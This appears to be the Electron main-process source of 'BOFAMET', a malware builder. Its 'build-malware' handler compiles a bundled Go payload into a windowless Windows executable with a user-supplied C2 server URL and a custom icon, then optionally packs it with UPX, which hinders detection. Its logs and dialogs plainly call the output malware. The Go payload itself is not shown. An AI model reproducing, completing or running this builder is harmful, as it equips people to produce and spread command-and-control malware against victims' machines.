const { app, BrowserWindow, ipcMain, dialog } = require('electron');
const path = require('path');
const { exec } = require('child_process');
const fs = require('fs');
const util = require('util');
const execPromise = util.promisify(exec);
const os = require('os'); // Added missing import for os

function createWindow() {
  const mainWindow = new BrowserWindow({
    width: 1134,
    height: 1100,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      nodeIntegration: false,
      contextIsolation: true
    }
  });

  mainWindow.loadFile('index.html');
}

app.whenReady().then(() => {
  createWindow();

  ipcMain.handle('show-open-directory-dialog', async (event) => {
    const result = await dialog.showOpenDialog(BrowserWindow.fromWebContents(event.sender), {
      properties: ['openDirectory']
    });
    return result;
  });

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

ipcMain.on('build-malware', async (event, { c2Url, outputFileName, iconPath, outputDirectory, useUpx }) => {
  console.log(`BOFAMET: Build command received! C2 URL: ${c2Url}, Output file: ${outputFileName}, Icon: ${iconPath}, Output directory: ${outputDirectory}, Use UPX: ${useUpx}.`);

  const goSourceDirInsideBuilder = path.join(process.resourcesPath, 'go_module'); // ИСПРАВЛЕННЫЙ ПУТЬ
  const tempBuildDir = path.join(os.tmpdir(), `bofamet_build_${Date.now()}`); // Временная папка для сборки
  const mainGoPathInTemp = path.join(tempBuildDir, 'main.go');
  const tempIconPathInTemp = path.join(tempBuildDir, 'icon.ico');
  const rsrcSysoPathInTemp = path.join(tempBuildDir, 'rsrc.syso');

  const upxExecutablePath = path.join(process.resourcesPath, 'upx.exe'); // ИСПРАВЛЕННЫЙ ПУТЬ

  let targetOutputDirectory = goSourceDirInsideBuilder; // На случай, если outputDirectory не указан
  if (outputDirectory) {
    targetOutputDirectory = outputDirectory;
  }
  const finalExecutablePath = path.join(targetOutputDirectory, outputFileName + '.exe');

  try {
    // 1. Копируем исходники Go во временную папку
    console.log(`BOFAMET: Copying Go source from ${goSourceDirInsideBuilder} to temporary directory ${tempBuildDir}...`);
    await fs.promises.mkdir(tempBuildDir, { recursive: true });
    await fs.promises.cp(goSourceDirInsideBuilder, tempBuildDir, { recursive: true });
    console.log('BOFAMET: Go source copied to temporary directory.');

    // 2. Устанавливаем rsrc (если не установлен) во временной папке
    console.log(`BOFAMET: Running go get github.com/akavel/rsrc in ${tempBuildDir}...`);
    const getRsrcCommand = `go get github.com/akavel/rsrc`;
    const { stdout: getRsrcStdout, stderr: getRsrcStderr } = await execPromise(getRsrcCommand, { cwd: tempBuildDir });
    console.log(`BOFAMET: go get rsrc stdout:\n${getRsrcStdout}`);
    if (getRsrcStderr) {
        console.warn(`BOFAMET: go get rsrc stderr:\n${getRsrcStderr}`);
    }
    console.log('BOFAMET: go get rsrc completed.');

    // 3. Обрабатываем иконку
    if (iconPath) {
      console.log(`BOFAMET: Copying icon from ${iconPath} to ${tempIconPathInTemp}...`);
      await fs.promises.copyFile(iconPath, tempIconPathInTemp);
      console.log('BOFAMET: Icon copied.');

      console.log(`BOFAMET: Running rsrc.syso creation for icon in ${tempBuildDir}...`);
      const rsrcCommand = `go run github.com/akavel/rsrc -ico icon.ico -o rsrc.syso`;
      const { stdout: rsrcStdout, stderr: rsrcStderr } = await execPromise(rsrcCommand, { cwd: tempBuildDir });
      console.log(`BOFAMET: rsrc stdout:\n${rsrcStdout}`);
      if (rsrcStderr) {
          console.warn(`BOFAMET: rsrc stderr:\n${rsrcStderr}`);
      }
      console.log('BOFAMET: rsrc.syso created.');

    } else {
      console.log('BOFAMET: No icon selected, skipping icon embedding step.');
      // Если иконка не выбрана, убедимся, что rsrc.syso не остался от предыдущей сборки во временной папке
      if (fs.existsSync(rsrcSysoPathInTemp)) {
        console.log(`BOFAMET: Deleting old rsrc.syso from temporary directory: ${rsrcSysoPathInTemp}`);
        await fs.promises.unlink(rsrcSysoPathInTemp);
      }
    }

    // 4. Собираем малварь
    const buildCommand = `go build -ldflags "-X 'main.c2ServerURL=${c2Url}' -H=windowsgui" -o "${finalExecutablePath}" "${mainGoPathInTemp}"`;
    console.log(`BOFAMET: Starting Go malware build: ${buildCommand} in ${tempBuildDir}...`);

    const { stdout: buildStdout, stderr: buildStderr } = await execPromise(buildCommand, { cwd: tempBuildDir });

    console.log(`BOFAMET: Successfully built! ${buildStdout}`);
    if (buildStderr) {
        console.warn(`BOFAMET: Warnings during Go malware build: ${buildStderr}`);
    }

    // 5. UPX сжатие
    if (useUpx) {
        console.log(`BOFAMET: Starting UPX compression for ${finalExecutablePath}...`);
        const upxCommand = `"${upxExecutablePath}" --best --lzma "${finalExecutablePath}"`;
        try {
            const { stdout: upxStdout, stderr: upxStderr } = await execPromise(upxCommand);
            console.log(`BOFAMET: UPX stdout:\n${upxStdout}`);
            if (upxStderr) {
                console.warn(`BOFAMET: UPX stderr:\n${upxStderr}`);
            }
            console.log('BOFAMET: UPX compression completed.');
            dialog.showMessageBoxSync({
              type: 'info',
              title: 'Build and Compression Completed',
              message: `Malware successfully built and UPX compressed: ${finalExecutablePath}\n${upxStdout}`
            });
            event.reply('build-result', { success: true, message: `Successfully built and UPX compressed: ${finalExecutablePath}` });
        } catch (upxError) {
            console.error(`BOFAMET: UPX compression error: ${upxError.message}`);
            dialog.showErrorBox('UPX Compression Error', `Go file build succeeded, but UPX compression failed: ${upxError.message}`);
            event.reply('build-result', { success: false, message: `Go file build succeeded, but UPX compression failed: ${upxError.message}` });
        }
    } else {
        dialog.showMessageBoxSync({
          type: 'info',
          title: 'Build Completed',
          message: `Malware successfully built: ${finalExecutablePath}\n${buildStdout}`
        });
        event.reply('build-result', { success: true, message: `Successfully built: ${finalExecutablePath}` });
    }

  } catch (err) {
    console.error(`BOFAMET: General build process error: ${err.message}`);
    dialog.showErrorBox('Build Error', `Failed to build malware: ${err.message}`);
    event.reply('build-result', { success: false, message: `Error: ${err.message}` });
  } finally {
    // 6. Очистка временных файлов
    try {
        if (fs.existsSync(tempBuildDir)) {
            await fs.promises.rm(tempBuildDir, { recursive: true, force: true });
            console.log(`BOFAMET: Temporary build directory deleted: ${tempBuildDir}`);
        }
    } catch (cleanupError) {
        console.error(`BOFAMET: Error during temporary directory cleanup: ${cleanupError.message}`);
    }
  }
}); 